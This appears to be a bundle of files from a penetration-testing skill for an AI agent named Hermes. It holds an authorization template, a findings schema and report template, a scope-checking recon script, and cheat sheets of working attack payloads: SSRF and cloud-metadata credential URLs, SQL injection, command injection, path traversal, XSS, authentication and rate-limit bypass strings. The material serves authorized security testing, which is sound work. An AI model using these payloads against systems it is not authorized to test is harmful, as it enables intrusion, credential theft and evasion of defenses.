- Operator-owned callback (`https://hermes-callback.example/abcdef`)
  — confirms the request left the target's network
- Internal recon (operator OK + scope): `http://127.0.0.1:6379/`,
  `http://127.0.0.1:9200/`, `http://[::1]:80/`

Cloud metadata (operator OK + your own infra):
- AWS: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- GCP: `http://metadata.google.internal/computeMetadata/v1/` (needs
  `Metadata-Flavor: Google`)
- Azure: `http://169.254.169.254/metadata/identity/oauth2/token`
- Alibaba/Aliyun: `http://100.100.100.200/`

Protocol smuggling:
- `gopher://` for Redis/Memcache/SMTP attacks (only with operator OK)
- `file:///` for local file read
- `dict://` for service probing

## Infra

- Headers audit: missing `Strict-Transport-Security`, `Content-Security-Policy`,
  `X-Content-Type-Options: nosniff`, `X-Frame-Options`/`frame-ancestors`,
  `Referrer-Policy`
- TLS audit: weak ciphers, missing HSTS, mixed content
- Information disclosure: `Server:`, `X-Powered-By:`, error stack traces,
  default landing pages (`/server-status`, `/.git/`, `/.env`, `/phpinfo.php`)
- Default creds: only on lab targets
- Open redirects: `?next=https://evil.example/` — confirms misuse for
  phishing chains

## Defense Recognition (don't waste cycles)

Skip past these — they're working defenses, not vulns:

- Parameterized queries via the language's standard binding
- Content Security Policy with no `unsafe-inline`/`unsafe-eval` and
  a strict source list
- argv-list subprocess invocation (Python `subprocess.run([...])`
  without `shell=True`)
- `yaml.safe_load`, JSON-only deserialization
- Allowlist-based redirects to a small set of known hosts
- Auth checks with explicit "owner == current_user" on every record fetch
- JWT verification with both `alg` allowlist and `iss`/`aud`/`exp` checks



<!-- ===== SOURCE: bypass-techniques.md ===== -->

# Bypass Techniques

Common filter/WAF bypasses. Used during the bypass-exhaustion phase
before classifying a finding as false positive.

A finding may only be marked `false_positive` AFTER the relevant
bypass set has been exhausted and the witnesses still fail.

## SQL Injection Bypasses

When `'` is filtered/escaped:
- Numeric injection: drop the quote, use `1 OR 1=1`
- Different quote: `"` instead of `'`
- Comment-based: `1/**/OR/**/1=1`
- Hex literal: `0x61646d696e` for `admin`
- `CHAR(65,66)` for `AB`
- Case variation: `OoRr` (often stripped to `OR`)
- Inline comments: `O/**/R`
- Null byte: `' %00 OR '1`=`1`
- Double URL encoding: `%2527` for `'`
- Multi-byte: `%bf%27` (works against some single-byte unescape)

## Command Injection Bypasses

When semicolons filtered:
- Newline: `%0Asleep 5`
- Carriage return: `%0Dsleep 5`
- Pipe: `|sleep 5`, `||sleep 5`
- Background: `&sleep 5`, `&&sleep 5`
- Substitution: `$(sleep 5)`, `` `sleep 5` ``
- Globbing: `/???/?l??p 5` for `/bin/sleep 5`
- IFS for spaces: `sleep${IFS}5`, `sleep$IFS$95`
- Quote evasion: `s""leep 5`, `s'l'eep 5`
- Variable: `a=sl;b=eep;${a}${b} 5`
- Encoding: `bash<<<$(base64 -d <<< c2xlZXAgNQo=)`

## Path Traversal Bypasses

When `../` filtered:
- URL-encoded: `%2e%2e%2f`
- Double URL-encoded: `%252e%252e%252f`
- Unicode: `%c0%ae%c0%ae%c0%af`, `%uff0e%uff0e%u2215`
- Mixed: `..%2f`, `%2e./`
- Null byte (older platforms): `../../../etc/passwd%00.png`
- Backslash on Windows: `..\..\..\windows\win.ini`
- Absolute path: `/etc/passwd` (skips traversal entirely)

When base dir is prepended (`/var/www/uploads/${v}`):
- The traversal still works if `realpath` not enforced
- Try ending the path early: `../../etc/passwd%00`

## XSS Bypasses

When `<script>` blocked:
- `<img src=x onerror=...>`
- `<svg/onload=...>`
- `<iframe srcdoc="...">`
- `<details ontoggle=...>` (HTML5)
- `<video><source onerror=...>`
- `<input autofocus onfocus=...>`

When parens filtered:
- Template literals: `onerror=alert\`1\``
- `onerror=eval('alert(1)')` → `onerror=eval(name)` + set
  `window.name` from attacker page

When event handlers stripped:
- `<a href="javascript:alert(1)">` (often still works)
- `<form action="javascript:alert(1)"><input type=submit>`
- SVG: `<svg><animate attributeName=href values=javascript:alert(1) ...>`

When `alert` filtered:
- `confirm(1)`, `prompt(1)`, `print()`
- `top.alert(1)`, `self['ale'+'rt'](1)`
- `window['ale\u0072t'](1)` (unicode in property access)
- `Function("alert(1)")()`

CSP bypasses (require CSP misconfig):
- `unsafe-inline` allows everything
- `unsafe-eval` allows `eval`/`Function`
- Wildcard sources (`*.googleapis.com`) — angular/jsonp gadgets
- `'strict-dynamic'` without nonce/hash on inline → still blocked but
  external scripts allowed via trusted loader
- Old CSP without `default-src`/`script-src` → only blocks listed

## Authentication Bypasses

- HTTP verb tampering: `GET /admin` blocked → try `POST`, `PUT`, `OPTIONS`
- Path normalization: `/admin/` blocked → try `/admin`, `/admin/.`,
  `/admin/x/..`, `//admin`, `/%2e/admin`, `/Admin` (case)
- Header injection: `X-Original-URL: /admin`, `X-Forwarded-For: 127.0.0.1`,
  `X-Real-IP: 127.0.0.1`, `X-Forwarded-Proto: https`
- Trailing chars: `/admin#`, `/admin?`, `/admin/`, `/admin.json`,
  `/admin..;/`, `/admin/..;/`
- Method confusion via `X-HTTP-Method-Override: GET`

## SSRF Bypasses

When `127.0.0.1` blocked:
- IPv6 loopback: `[::1]`, `[0:0:0:0:0:0:0:1]`
- Decimal IP: `2130706433` for `127.0.0.1`
- Hex IP: `0x7f000001`
- Octal: `0177.0.0.1`
- Short form: `127.1`, `0.0.0.0`, `0`
- DNS rebinding: control a DNS server, return `127.0.0.1` on second
  resolution (TTL=0)
- DNS records that resolve to internal IPs: `localtest.me` (127.0.0.1)
- URL parsing differentials: `http://allowed-host@127.0.0.1`,
  `http://127.0.0.1#@allowed-host`
- IDN homograph: `http://1．0．0．1` (fullwidth dots)

When schemes blocked:
- `gopher://`, `dict://`, `file://`, `ftp://`
- `data:` (for content-type bypass)
- `jar:` (Java)

## Rate Limit Bypasses

- Header rotation: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`,
  `X-Client-IP`, `X-Cluster-Client-IP`, `Forwarded`
- Case: `X-FORWARDED-FOR`
- User-Agent variation
- Different endpoint that hits same handler

## Bypass Discipline

For each bypass attempt:
1. Note WHAT you tried and WHY it might work (in your evidence log)
2. Capture the response
3. If still blocked, move to the next item in the bypass set
4. Only after the documented bypass set is exhausted do you write
   `verdict: false_positive` with reason "bypass set exhausted; defense
   appears effective for this slot type."



<!-- ===== SOURCE: authorization.md ===== -->

# Engagement Authorization

Fill out before any active testing. Save to `engagement/authorization.md`.

---

**Engagement ID:** <UUID or short slug>
**Operator:** <name of the person driving this Hermes session>
**Date opened:** <ISO 8601 timestamp>
**Engagement window:** <start ISO timestamp> through <end ISO timestamp>

## Target

- Primary URL(s):
  - https://...
- Primary IP(s):
  - X.X.X.X
- Hostnames covered:
  - host.example.com
  - api.host.example.com
- Networks covered (CIDR):
  - 10.0.0.0/24 (internal lab)

## Authorization Basis

(Pick one — record evidence in writing for anything but ownership.)

- [ ] Operator owns the application and infrastructure being tested.
- [ ] Written authorization from <name, role, organization, date>.
      Document stored at: <path or link to signed authorization>.
- [ ] Hermes Agent dashboard, running on this same workstation, used
      as a self-test target. Operator confirms no other user is
      connected to the dashboard instance during the engagement.

## Out of Scope (must not be tested)

- Production systems unless explicitly listed above
- Third-party APIs / SaaS the application calls into
- Other tenants if the target is multi-tenant
- Cloud metadata endpoints (169.254.169.254, etc.) unless explicitly
  included above
- Destructive payloads (DROP, DELETE, file writes outside test
  directories) without per-payload approval
- Active social engineering, phishing, physical security

## Constraints

- Rate limit: <N> req/s per host. Default 5/s (200ms gap).
- Hours: <none> | <only between HH:MM and HH:MM local>
- Notify-before for: <list of categories> e.g. "any payload that
  writes data," "any traffic that touches the auth endpoint after
  10pm local"

## Acknowledgement

By approving this engagement, the operator confirms:

1. The targets listed above are authorized for active testing by the
   listed authorization basis.
2. Testing may produce HTTP 4xx/5xx responses, log noise, alert
   notifications, and rate-limit triggers in monitoring systems.
3. The operator is responsible for any consequences of testing
   targets that are NOT correctly authorized.
4. The operator will revoke authorization (by stopping the agent) if
   the scope changes, the time window ends, or any unexpected
   off-scope behavior is observed.

**Operator signature (typed name):** ________________
**Confirmed at:** <ISO 8601 timestamp>



<!-- ===== SOURCE: exploitation-queue.json ===== -->

{
  "schema": "hermes-web-pentest exploitation-queue v1",
  "vuln_class": "injection|xss|auth|authz|ssrf|infra",
  "generated_at": "ISO 8601 timestamp",
  "engagement_id": "<engagement slug>",
  "candidates": [
    {
      "id": "INJ-001",
      "vuln_subclass": "sql_injection|command_injection|path_traversal|ssti|lfi|rfi|deserialization",
      "endpoint": {
        "method": "GET",
        "url": "https://target.example/api/items",
        "parameter": "id",
        "location": "query|body|header|cookie|path"
      },
      "source_ref": "path/to/file.py:123",
      "slot_type": "SQL-val|CMD-argument|PATH-segment|...",
      "suspected_defense": "none|parameterized|escape|allowlist|...",
      "verdict": "identified|partial|confirmed|critical|false_positive",
      "confidence": 0.7,
      "witness_payload": "' AND 1=1--",
      "witness_response_signal": "row count change | timing | reflected marker | ...",
      "bypass_attempts": [
        {
          "payload": "%2527%20OR%201=1--",
          "blocked": true,
          "notes": "WAF returned 403 on encoded variant"
        }
      ],
      "notes": "free text",
      "next_action": "send_witness | escalate_to_L3 | classify_FP | abort_scope_concern"
    }
  ]
}



<!-- ===== SOURCE: pentest-report.md ===== -->

# Penetration Test Report

**Target:** <name + URL>
**Engagement ID:** <slug>
**Engagement window:** <start> – <end>
**Operator:** <name>
**Tester:** Hermes Agent + operator
**Report generated:** <ISO 8601 timestamp>

---

## Executive Summary

<2-4 paragraph plain-language summary. Focus on:
 - What was tested
 - What was found (count by severity)
 - Most critical finding in one sentence
 - High-level remediation recommendation>

| Severity | Count |
|----------|-------|
| Critical | 0     |
| High     | 0     |
| Medium   | 0     |
| Low      | 0     |
| Info     | 0     |

---

## Engagement Scope

In-scope targets (from `engagement/scope.txt`):

- <host or CIDR>

Out of scope: see `engagement/authorization.md`.

Authorization basis: see `engagement/authorization.md`.

## Methodology

Approach was based on the Hermes `web-pentest` skill (a Hermes Agent
adaptation of the OWASP Testing Guide with elements of Shannon's
proof-based methodology). Phases performed:

- [ ] Pre-recon (source code review)
- [ ] Recon (live, read-only)
- [ ] Vulnerability analysis (one queue per OWASP class)
- [ ] Exploitation (proof-based)
- [ ] Reporting

Tools used: <nmap, whatweb, curl, Hermes browser tool, ...>.

## Findings (L3/L4 — Verified Exploitable)

> Every finding in this section has a reproducible proof-of-concept.
> L1/L2 candidates that were not promoted to confirmed exploitation
> are listed in the "Not Exploited" section.

### F-001: <Title>

- **Severity:** Critical | High | Medium | Low
- **CVSS 3.1 vector:** `CVSS:3.1/AV:N/AC:L/...`
- **CVSS 3.1 base score:** N.N
- **CWE:** CWE-XX
- **Affected endpoint(s):** `GET https://target.example/api/...`
- **Affected parameter(s):** `id`
- **Discovered:** <date>

#### Description

<What is the bug, in plain language.>

#### Proof

Request:

```http
GET /api/items?id=1%27%20OR%201=1-- HTTP/1.1
Host: target.example
Cookie: session=...
```

Response (excerpt):

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id":1,...}, {"id":2,...}, ... <full table dumped>]
```

#### Reproduction

```bash
curl -sS 'https://target.example/api/items?id=1%27%20OR%201=1--' \
     -H 'Cookie: session=YOUR_TEST_SESSION'
```

#### Impact

<What an attacker gains. Be specific. "Could allow data extraction" is
worse than "Allowed extraction of all 4 columns from the `users` table
in our test (PoC redacted PII), and the same query shape applies to
any other parameter using the same code path.">

#### Remediation

<Specific, actionable. "Use parameterized queries" is better than
"sanitize inputs." Include code example if possible.>

#### Verification (post-fix)

To verify the fix, re-run the reproduction command. The response
should be HTTP 400, an empty result, or a result containing only the
record matching `id=1` literally.

---

(repeat per finding)

---

## Not Exploited (L1/L2 candidates)

Candidates that pattern-matched but were not promoted to L3 within
the engagement window. Listed for completeness; do NOT report these
as confirmed vulnerabilities.

| ID | Class | Endpoint | Status | Why not promoted |
|----|-------|----------|--------|------------------|
| INJ-002 | SQLi | `/api/search?q=` | L2 partial | Bypass set exhausted; appears to use parameterized binding |
| XSS-003 | reflected | `/error?msg=` | L1 identified | Could not produce executable context — output is JSON-encoded |

---

## Out-of-Scope Observations

(Findings or hints noticed but NOT tested because they were outside
scope. These are documentation, not findings. The operator decides
whether to extend scope and re-test.)

- The application sends to `https://third-party.example/...` — payload
  could trigger third-party-side bugs but third party is out of scope.

---

## Limitations

What was NOT tested, and why:

- <Class of test>: <reason>

Examples:
- DDoS / stress testing — explicitly excluded by engagement scope.
- Authenticated business-logic flows requiring billing — no test
  credit card available.
- Mobile API surfaces — out of scope.

---

## Appendices

- A: `engagement/authorization.md` — authorization on file
- B: `engagement/scope.txt` — machine-readable scope
- C: `engagement/request-log.jsonl` — every active request issued
- D: `findings/*-queue.json` — per-class candidate queues
- E: `evidence/` — raw captures (request/response pairs)

---

## Disclaimer

This report describes vulnerabilities discovered during a
time-bounded penetration test against the listed targets within the
listed scope. Absence of a finding in this report does not imply the
target is secure; only that no exploitable issue was found in scope
X within time T using methods Y.



<!-- ===== SOURCE: recon-scan.sh ===== -->

#!/usr/bin/env bash
# Rate-limited recon scan wrapper for the web-pentest skill.
# Wraps nmap + whatweb + curl headers; enforces scope.txt.
#
# Usage: recon-scan.sh <engagement-dir> <target-url>
#
# Example:
#   recon-scan.sh engagement-20260525-031415 http://127.0.0.1:9119
set -euo pipefail

ENGAGEMENT_DIR="${1:-}"
TARGET_URL="${2:-}"

if [[ -z "$ENGAGEMENT_DIR" || -z "$TARGET_URL" ]]; then
  echo "usage: $0 <engagement-dir> <target-url>" >&2
  exit 2
fi

if [[ ! -d "$ENGAGEMENT_DIR" ]]; then
  echo "Engagement directory $ENGAGEMENT_DIR does not exist." >&2
  echo "Run Phase 0 (engagement setup) first." >&2
  exit 2
fi

SCOPE_FILE="$ENGAGEMENT_DIR/scope.txt"
AUTH_FILE="$ENGAGEMENT_DIR/authorization.md"
EVIDENCE_DIR="$ENGAGEMENT_DIR/evidence"
LOG_FILE="$ENGAGEMENT_DIR/request-log.jsonl"

if [[ ! -f "$AUTH_FILE" ]]; then
  echo "Missing $AUTH_FILE — no engagement authorization on file." >&2
  echo "Fill out templates/authorization.md before running." >&2
  exit 3
fi

if [[ ! -f "$SCOPE_FILE" ]]; then
  echo "Missing $SCOPE_FILE — no scope allowlist on file." >&2
  exit 3
fi

mkdir -p "$EVIDENCE_DIR"

# Extract host from URL.
HOST="$(python3 -c "import sys, urllib.parse as u; print(u.urlparse(sys.argv[1]).hostname or '')" "$TARGET_URL")"
if [[ -z "$HOST" ]]; then
  echo "Could not parse host from URL: $TARGET_URL" >&2
  exit 4
fi

# Scope check: hostname must appear literally in scope.txt, OR the
# resolved IP must fall inside a CIDR listed there.
in_scope() {
  local host="$1"
  while IFS= read -r line; do
    # strip comments + whitespace
    local entry
    entry="$(printf '%s' "$line" | sed 's/#.*//' | tr -d '[:space:]')"
    [[ -z "$entry" ]] && continue
    if [[ "$entry" == "$host" ]]; then
      return 0
    fi
    # If entry is CIDR, check via python
    if [[ "$entry" == */* ]]; then
      python3 - "$host" "$entry" <<'PY' && return 0
import sys, socket, ipaddress
host, cidr = sys.argv[1], sys.argv[2]
try:
    ip = socket.gethostbyname(host)
    if ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False):
        sys.exit(0)
except Exception:
    pass
sys.exit(1)
PY
    fi
  done < "$SCOPE_FILE"
  return 1
}

if ! in_scope "$HOST"; then
  echo "Host '$HOST' is NOT in $SCOPE_FILE. Refusing to scan." >&2
  echo "Add it to scope.txt only if it is genuinely authorized." >&2
  exit 5
fi

# Resolve URL for logging
TS="$(date -u +%Y-%m-%dT%H:%M:%SZ)"
echo "[recon-scan] target=$TARGET_URL host=$HOST ts=$TS"

# --- headers ---
echo "[recon-scan] fetching headers..."
HEADERS_FILE="$EVIDENCE_DIR/headers.txt"
curl -sSIk --max-time 15 -A "hermes-pentest/recon" "$TARGET_URL" > "$HEADERS_FILE" || true
sleep 0.2

# --- whatweb ---
if command -v whatweb >/dev/null 2>&1; then
  echo "[recon-scan] running whatweb..."
  whatweb -v --no-errors "$TARGET_URL" > "$EVIDENCE_DIR/whatweb.txt" 2>&1 || true
  sleep 0.2
else
  echo "[recon-scan] whatweb not installed — skipping. Install with: apt install whatweb"
fi

# --- robots / sitemap / .well-known ---
echo "[recon-scan] checking robots/sitemap/.well-known..."
for path in robots.txt sitemap.xml .well-known/security.txt; do
  outfile="$EVIDENCE_DIR/$(echo "$path" | tr / _).txt"
  curl -sSk --max-time 10 -A "hermes-pentest/recon" -o "$outfile" -w "%{http_code}\n" "$TARGET_URL/$path" \
       > "$outfile.status" || true
  sleep 0.2
done

# --- nmap (top 100 ports, default scripts off, scope-bounded) ---
if command -v nmap >/dev/null 2>&1; then
  echo "[recon-scan] running nmap (top 100 ports, T3, no NSE)..."
  nmap -sT -T3 --top-ports 100 -Pn -oN "$EVIDENCE_DIR/nmap.txt" "$HOST" >/dev/null 2>&1 || true
else
  echo "[recon-scan] nmap not installed — skipping. Install with: apt install nmap"
fi

# Log entry
printf '{"ts":"%s","phase":"recon","url":"%s","host":"%s","in_scope":true,"evidence_ref":"evidence/"}\n' \
  "$TS" "$TARGET_URL" "$HOST" >> "$LOG_FILE"

echo "[recon-scan] done. Evidence in $EVIDENCE_DIR/"

